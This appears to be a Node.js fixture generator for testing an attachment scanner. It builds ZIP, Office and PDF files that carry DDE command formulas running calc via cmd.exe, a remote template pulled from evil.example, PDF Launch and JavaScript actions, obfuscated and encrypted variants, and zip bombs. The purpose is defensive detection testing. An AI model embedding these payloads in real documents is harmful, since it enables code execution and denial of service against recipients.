// 添付の中身の検査（kit/core/attach-content.mjs。format spec §3.8）の試験の入力を、その場で作る道具（tools/test-attachments.mjs が使う）：
// 小さな PDF（JavaScript・自動の動作・埋め込み・object stream・展開の爆弾）、OOXML（xlsx・docx。マクロ・外部リンク・DDE・フィールド・テンプレート）、ZIP
import zlib from 'node:zlib';
const crcTable = (() => { const t = new Uint32Array(256); for (let n = 0; n < 256; n++) { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; t[n] = c >>> 0; } return t; })();
const crc32 = (b) => { let c = 0xffffffff; for (const x of b) c = crcTable[(c ^ x) & 0xff] ^ (c >>> 8); return (c ^ 0xffffffff) >>> 0; };
// files: [[name, Buffer|string, {store?}]]
export function zip(files, { prefix = Buffer.alloc(0), suffix = Buffer.alloc(0) } = {}) {
  const locals = [], cds = [];
  let off = prefix.length;
  for (const [name, data0, o = {}] of files) {
    const data = Buffer.from(data0), nb = Buffer.from(name);
    const comp = o.store ? data : zlib.deflateRawSync(data);
    const method = o.store ? 0 : 8;
    const lh = Buffer.alloc(30); lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt16LE(0, 6); lh.writeUInt16LE(method, 8);
    lh.writeUInt32LE(crc32(data), 14); lh.writeUInt32LE(comp.length, 18); lh.writeUInt32LE(o.usize ?? data.length, 22); lh.writeUInt16LE(nb.length, 26);
    locals.push(lh, nb, comp);
    const cd = Buffer.alloc(46); cd.writeUInt32LE(0x02014b50, 0); cd.writeUInt16LE(20, 4); cd.writeUInt16LE(20, 6); cd.writeUInt16LE(method, 10);
    cd.writeUInt32LE(crc32(data), 16); cd.writeUInt32LE(comp.length, 20); cd.writeUInt32LE(o.usize ?? data.length, 24); cd.writeUInt16LE(nb.length, 28); cd.writeUInt32LE(off, 42);
    cds.push(cd, nb);
    off += 30 + nb.length + comp.length;
  }
  const cdBuf = Buffer.concat(cds);
  const e = Buffer.alloc(22); e.writeUInt32LE(0x06054b50, 0); e.writeUInt16LE(files.length, 8); e.writeUInt16LE(files.length, 10); e.writeUInt32LE(cdBuf.length, 12); e.writeUInt32LE(off, 16);
  return Buffer.concat([prefix, ...locals, cdBuf, e, suffix]);
}
const CT = (main, extra = '') => `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/>${main}${extra}</Types>`;
const RELS = (target) => `<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="${target}"/></Relationships>`;
// xlsx：opts.macro・externalLink・dde・webservice・activeX・ole・injection
export function xlsx(o = {}) {
  const mainType = o.macro ? 'application/vnd.ms-excel.sheet.macroEnabled.main+xml' : 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml';
  let extra = '<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/><Override PartName="/xl/sharedStrings.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/>';
  const f = o.webservice ? '<f>_xlfn.WEBSERVICE("http://example.com/x")</f>' : o.dde ? "<f>cmd|' /C calc'!A0</f>" : '<f>SUM(A1:A2)</f>';
  const files = [
    ['[Content_Types].xml', null],
    ['_rels/.rels', RELS('xl/workbook.xml')],
    ['xl/workbook.xml', '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets><sheet name="S" sheetId="1" r:id="rId1"/></sheets></workbook>'],
    ['xl/_rels/workbook.xml.rels', `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>${o.externalLink ? '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink" Target="externalLinks/externalLink1.xml"/>' : ''}</Relationships>`],
    ['xl/worksheets/sheet1.xml', `<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1"><c r="A1"><v>1</v></c><c r="B1" t="s"><v>0</v></c><c r="C1">${f}<v>3</v></c></row></sheetData></worksheet>`],
    ['xl/sharedStrings.xml', `<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><si><t>${o.injection ? '=HYPERLINK(&quot;http://x&quot;)' : 'hello'}</t></si></sst>`],
  ];
  if (o.macro) { files.push(['xl/vbaProject.bin', Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 1, 2, 3])]); extra += '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'; }
  if (o.externalLink) { files.push(['xl/externalLinks/externalLink1.xml', '<externalLink/>'], ['xl/externalLinks/_rels/externalLink1.xml.rels', '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLinkPath" Target="file:///C:/x.xlsx" TargetMode="External"/></Relationships>']); extra += '<Override PartName="/xl/externalLinks/externalLink1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml"/>'; }
  if (o.activeX) files.push(['xl/activeX/activeX1.xml', '<ax/>']);
  if (o.ole) files.push(['xl/embeddings/oleObject1.bin', Buffer.from([1, 2, 3])]);
  files[0][1] = CT(`<Override PartName="/xl/workbook.xml" ContentType="${mainType}"/>`, extra);
  return zip(files, o.zip);
}
// docx：opts.macro・dde（DDEAUTO のフィールド）・includeText（fldSimple）・nested・template（外のテンプレート）
export function docx(o = {}) {
  const mainType = o.macro ? 'application/vnd.ms-word.document.macroEnabled.main+xml' : 'application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml';
  let body = '<w:p><w:r><w:t>Hello</w:t></w:r></w:p>';
  if (o.dde) body += '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>';
  if (o.includeText) body += '<w:p><w:fldSimple w:instr=" INCLUDETEXT &quot;http://example.com/a.docx&quot; "><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p>';
  if (o.nested) body += '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>QUOTE 68 68 69</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r><w:r><w:instrText> x</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>';
  if (o.hyperlinkField) body += '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> HYPERLINK "http://example.com/link" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>link</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>';
  const files = [
    ['[Content_Types].xml', CT(`<Override PartName="/word/document.xml" ContentType="${mainType}"/>`, o.macro ? '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>' : '')],
    ['_rels/.rels', RELS('word/document.xml')],
    ['word/document.xml', `<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>${body}</w:body></w:document>`],
    ['word/_rels/document.xml.rels', '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://example.com/" TargetMode="External"/></Relationships>'],
  ];
  if (o.template) files.push(['word/_rels/settings.xml.rels', '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>']);
  if (o.macro) files.push(['word/vbaProject.bin', Buffer.from([0xd0, 0xcf, 0x11, 0xe0])]);
  return zip(files, o.zip);
}
// PDF：本文の object を並べ、xref と trailer を付ける。objs：['<< … >>', …]（1 から番号）。streams：{n: Buffer}（その object の stream）
export function pdf(objs, { streams = {}, trailer = '' } = {}) {
  const parts = [Buffer.from('%PDF-1.7\n%\xe2\xe3\xcf\xd3\n', 'latin1')];
  let off = parts[0].length;
  const offs = [];
  objs.forEach((o, i) => {
    const n = i + 1, s = streams[n];
    const head = Buffer.from(`${n} 0 obj\n${s ? o.replace(/>>\s*$/, ` /Length ${s.length} >>`) : o}\n${s ? 'stream\n' : ''}`, 'latin1');
    const tail = Buffer.from(`${s ? '\nendstream' : ''}\nendobj\n`, 'latin1');
    offs.push(off);
    parts.push(head, ...(s ? [s] : []), tail);
    off += head.length + (s ? s.length : 0) + tail.length;
  });
  const xref = `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n` + offs.map((o) => String(o).padStart(10, '0') + ' 00000 n \n').join('');
  parts.push(Buffer.from(`${xref}trailer\n<< /Size ${objs.length + 1} /Root 1 0 R ${trailer}>>\nstartxref\n${off}\n%%EOF\n`, 'latin1'));
  return Buffer.concat(parts);
}
// 普通の PDF：行き先の /OpenAction・本文の中の「/JS」「/AA」の字（文字列と stream の中は名前ではない）。pad：本文の stream の大きさを増やす
export const PDF_OK = (pad = 0) => pdf(['<< /Type /Catalog /Pages 2 0 R /OpenAction [3 0 R /FitH null] >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Annots [<< /Subtype /Link /A << /S /URI /URI (https://example.com/AA) >> >>] >>', '<< >>'],
  { streams: { 4: Buffer.concat([Buffer.from('BT /F1 12 Tf (see https://example.com/JS and /AA) Tj ET\n'), Buffer.alloc(pad, 0x20)]) } });
export const PDF_JS = () => pdf(['<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>', '<< /Type /Pages /Kids [] /Count 0 >>', '<< /S /JavaScript /JS (app.alert\\(1\\)) >>']);
export const PDF_JS_HEX = () => pdf(['<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>', '<< /Type /Pages /Kids [] /Count 0 >>', '<< /S /J#61vaScript /J#53 (x) >>']);
export const PDF_OPENACTION_GOTO = () => pdf(['<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /GoTo /D [2 0 R /Fit] >> >>', '<< /Type /Pages /Kids [] /Count 0 >>']);
export const PDF_OPENACTION_DEST_REF = () => pdf(['<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>', '<< /Type /Pages /Kids [] /Count 0 >>', '[2 0 R /Fit]']);
export const PDF_AA = () => pdf(['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', '<< /Type /Page /Parent 2 0 R /AA << /O << /S /URI /URI (http://x) >> >> >>']);
export const PDF_LAUNCH = () => pdf(['<< /Type /Catalog /Pages 2 0 R /Names << >> >>', '<< /Type /Pages /Kids [] /Count 0 >>', '<< /S /Launch /F (calc.exe) >>']);
export const PDF_EMBEDDED = () => pdf(['<< /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles << /Names [(a.exe) 3 0 R] >> >> >>', '<< /Type /Pages /Kids [] /Count 0 >>', '<< /Type /Filespec /F (a.exe) /EF << /F 4 0 R >> >>', '<< /Type /EmbeddedFile >>'], { streams: { 4: Buffer.from('MZ') } });
// object stream（圧縮）の中の object 4（JavaScript の動作）を /OpenAction が指す
export function PDF_OBJSTM_JS() {
  const body = Buffer.from('4 0 << /S /JavaScript /JS (app.alert\\(1\\)) >>');
  return pdf(['<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>', '<< /Type /Pages /Kids [] /Count 0 >>', '<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode >>'],
    { streams: { 3: zlib.deflateSync(body) } });
}
// object stream の中の、文書の中へ移るだけの /OpenAction（hyperref が書く形）：断らない
export function PDF_OBJSTM_GOTO() {
  const body = Buffer.from('4 0 << /S /GoTo /D [2 0 R /Fit] >>');
  return pdf(['<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>', '<< /Type /Pages /Kids [] /Count 0 >>', '<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode >>'],
    { streams: { 3: zlib.deflateSync(body) } });
}
// 開いたときに URL を開く /OpenAction
export const PDF_OPENACTION_URI = () => pdf(['<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /URI /URI (http://example.com/) >> >>', '<< /Type /Pages /Kids [] /Count 0 >>']);
// 展開の爆弾の object stream
export const PDF_OBJSTM_BOMB = () => pdf(['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [] /Count 0 >>', '<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode >>'], { streams: { 3: zlib.deflateSync(Buffer.alloc(80 * 1048576, 0x20)) } });
// 古い形式の Office（OLE の複合文書）の印
export const OLE = () => Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), Buffer.alloc(504)]);
// 実行できるファイル：Windows（MZ…PE）・Linux（ELF）・macOS（Mach-O）・WebAssembly
export const EXE = () => { const b = Buffer.alloc(0x80); b.write('MZ', 0, 'latin1'); b.writeUInt32LE(0x40, 0x3c); b.write('PE\0\0', 0x40, 'latin1'); return b; };
export const ELF = () => Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), Buffer.alloc(56)]);
export const MACHO = () => Buffer.concat([Buffer.from([0xcf, 0xfa, 0xed, 0xfe]), Buffer.alloc(28)]);
export const WASM = () => Buffer.from([0x00, 0x61, 0x73, 0x6d, 1, 0, 0, 0]);
export const PNG = () => Buffer.concat([Buffer.from('\x89PNG\r\n\x1a\n', 'latin1'), Buffer.from('0000000dIHDR', 'latin1'), Buffer.alloc(20)]);
export const JPEG = () => Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(20), Buffer.from([0xff, 0xd9])]);
export const WEBP = () => Buffer.concat([Buffer.from('RIFF\x1a\x00\x00\x00WEBPVP8 ', 'latin1'), Buffer.alloc(14)]);
// 展開の爆弾：宣言の大きさが上限を超える・圧縮率が高すぎる・宣言より大きく展開される・項目が重なる
export const ZIP_BOMB_DECLARED = () => zip([['[Content_Types].xml', '<Types/>'], ['xl/worksheets/sheet1.xml', 'x', { usize: 200 * 1048576 }]]);
export const ZIP_BOMB_RATIO = () => zip([['[Content_Types].xml', '<Types/>'], ['xl/worksheets/sheet1.xml', Buffer.alloc(40 * 1048576, 0x20)]]);
export const ZIP_BOMB_LIE = () => zip([['[Content_Types].xml', Buffer.alloc(100000, 0x20), { usize: 100 }]]);
export function ZIP_OVERLAP() {
  // 2 つの項目が同じデータを指す（Fifield の重なった ZIP の爆弾）
  const z = zip([['[Content_Types].xml', '<Types/>'], ['b.xml', '<b/>']]);
  const cd = z.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]));
  const second = z.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]), cd + 4);
  z.writeUInt32LE(0, second + 42);
  return z;
}
// 暗号化した PDF（標準の暗号 R 4・AESV2。利用者のパスワードは空、または password）：object stream（object 4）を暗号化する。js：その中に JavaScript
import crypto from 'node:crypto';
const PDF_PAD = Buffer.from([0x28, 0xbf, 0x4e, 0x5e, 0x4e, 0x75, 0x8a, 0x41, 0x64, 0x00, 0x4e, 0x56, 0xff, 0xfa, 0x01, 0x08, 0x2e, 0x2e, 0x00, 0xb6, 0xd0, 0x68, 0x3e, 0x80, 0x2f, 0x0c, 0xa9, 0xfe, 0x64, 0x53, 0x69, 0x7a]);
const md5 = (...b) => crypto.createHash('md5').update(Buffer.concat(b)).digest();
function rc4(key, data) {
  const S = [...Array(256).keys()];
  for (let i = 0, j = 0; i < 256; i++) { j = (j + S[i] + key[i % key.length]) & 255; [S[i], S[j]] = [S[j], S[i]]; }
  const out = Buffer.alloc(data.length);
  for (let k = 0, i = 0, j = 0; k < data.length; k++) { i = (i + 1) & 255; j = (j + S[i]) & 255; [S[i], S[j]] = [S[j], S[i]]; out[k] = data[k] ^ S[(S[i] + S[j]) & 255]; }
  return out;
}
export function PDF_ENCRYPTED({ js = false, password = '', aes = true } = {}) {
  const ID0 = Buffer.from('0123456789abcdef0123456789abcdef', 'hex'), O = Buffer.alloc(32, 7), P = -1324;
  const pw = Buffer.concat([Buffer.from(password, 'latin1'), PDF_PAD]).subarray(0, 32);
  const p = Buffer.alloc(4); p.writeInt32LE(P);
  let key = md5(pw, O, p, ID0).subarray(0, 16);
  for (let i = 0; i < 50; i++) key = md5(key).subarray(0, 16);
  let x = rc4(key, md5(PDF_PAD, ID0));
  for (let i = 1; i <= 19; i++) x = rc4(key.map((k) => k ^ i), x);
  const U = Buffer.concat([x, Buffer.alloc(16)]);
  const body = Buffer.from(js ? '6 0 << /S /JavaScript /JS (app.alert\\(1\\)) >>' : '6 0 [2 0 R /Fit]');
  const ok = md5(key, Buffer.from([3, 0, 0, 0, 0]), aes ? Buffer.from('sAlT') : Buffer.alloc(0)).subarray(0, 16);
  const plain = zlib.deflateSync(body);
  let enc;
  if (aes) { const iv = Buffer.alloc(16, 9); const c = crypto.createCipheriv('aes-128-cbc', ok, iv); enc = Buffer.concat([iv, c.update(plain), c.final()]); }
  else enc = rc4(ok, plain);
  const hex = (b) => '<' + b.toString('hex') + '>';
  return pdf(['<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R >>', '<< /Type /Pages /Kids [] /Count 0 >>', '<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode >>',
    `<< /Filter /Standard /V 4 /R 4 /Length 128 /CF << /StdCF << /CFM /${aes ? 'AESV2' : 'V2'} /Length 16 >> >> /StmF /StdCF /StrF /StdCF /O ${hex(O)} /U ${hex(U)} /P ${P} >>`],
  { streams: { 3: enc }, trailer: `/Encrypt 4 0 R /ID [${hex(ID0)} ${hex(ID0)}] ` });
}
// 暗号化した PDF（R 6・AES-256。利用者のパスワードは空）：ISO 32000-2 の Algorithm 2.B で U・UE を作る
function hash2B(pw, salt, u) {
  let K = crypto.createHash('sha256').update(Buffer.concat([pw, salt, u])).digest();
  for (let round = 0; ; round++) {
    const K1 = Buffer.concat(Array(64).fill(Buffer.concat([pw, K, u])));
    const c = crypto.createCipheriv('aes-128-cbc', K.subarray(0, 16), K.subarray(16, 32)); c.setAutoPadding(false);
    const E = Buffer.concat([c.update(K1), c.final()]);
    let sum = 0; for (let i = 0; i < 16; i++) sum += E[i];
    K = crypto.createHash(['sha256', 'sha384', 'sha512'][sum % 3]).update(E).digest();
    if (round >= 63 && E[E.length - 1] <= round - 32) return K.subarray(0, 32);
  }
}
export function PDF_ENCRYPTED_R6({ js = false } = {}) {
  const fileKey = Buffer.alloc(32, 5), vs = Buffer.alloc(8, 1), ks = Buffer.alloc(8, 2), none = Buffer.alloc(0);
  const U = Buffer.concat([hash2B(none, vs, none), vs, ks]);
  const c = crypto.createCipheriv('aes-256-cbc', hash2B(none, ks, none), Buffer.alloc(16)); c.setAutoPadding(false);
  const UE = Buffer.concat([c.update(fileKey), c.final()]);
  const body = Buffer.from(js ? '6 0 << /S /JavaScript /JS (app.alert\\(1\\)) >>' : '6 0 [2 0 R /Fit]');
  const iv = Buffer.alloc(16, 3), e = crypto.createCipheriv('aes-256-cbc', fileKey, iv);
  const enc = Buffer.concat([iv, e.update(zlib.deflateSync(body)), e.final()]);
  const hex = (b) => '<' + b.toString('hex') + '>';
  return pdf(['<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R >>', '<< /Type /Pages /Kids [] /Count 0 >>', '<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode >>',
    `<< /Filter /Standard /V 5 /R 6 /Length 256 /CF << /StdCF << /CFM /AESV3 /Length 32 >> >> /StmF /StdCF /StrF /StdCF /O ${hex(Buffer.alloc(48, 4))} /U ${hex(U)} /OE ${hex(Buffer.alloc(32, 6))} /UE ${hex(UE)} /P -1028 /Perms ${hex(Buffer.alloc(16))} >>`],
  { streams: { 3: enc }, trailer: `/Encrypt 4 0 R /ID [<00> <00>] ` });
}
